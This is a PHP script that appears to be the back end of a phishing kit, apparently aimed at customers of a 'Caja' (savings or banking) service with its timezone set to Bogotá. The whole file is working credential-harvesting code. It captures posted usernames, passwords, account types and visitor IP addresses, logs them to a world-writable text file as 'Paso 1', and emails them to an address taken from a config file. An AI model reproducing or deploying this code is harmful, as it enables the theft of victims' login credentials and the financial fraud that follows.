<?php 
require('../config.php');
date_default_timezone_set('America/Bogota');
$usuario = $_POST['usr'];
$pass = $_POST['pas'];
$tipo = $_POST['tip'];

$ipcliente= $_SERVER['REMOTE_ADDR'];


$datos = 'Usuario: ['.$tipo.'] '.$usuario.' | Clave: '.$pass.' | IP: '.$ipcliente;


$file = '../listado.txt';
$salto = "";
$cabecera = "---------------- Paso 1 (".date("Y-m-d H:i:s").")";

$fp = fopen($file, 'a+');
fwrite($fp, $salto.PHP_EOL);
fwrite($fp, $salto.PHP_EOL);
fwrite($fp, $cabecera.PHP_EOL);
fwrite($fp, utf8_decode($datos).PHP_EOL);
fclose($fp);
chmod($file, 0777);
echo $file;

$hoy1 = date("Y/m/d");  
$hoy2 = date("Y-m-d H:i:s");  

$to = $destino;
$subject = "Datos Caja Paso 1 ".$usuario." - ".$hoy1;
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
 
$message = "
<html>
<head>
<title>Datos</title>
</head>
<body>
<b>Usuario: </b>".$usuario." <b>Contraseña: </b>".$pass." <b>Dirección IP: </b>".$ipcliente." <b>Fecha: </b>".$hoy2."
</body>
</html>";
 
mail($to, $subject, $message, $headers);
exit();
?>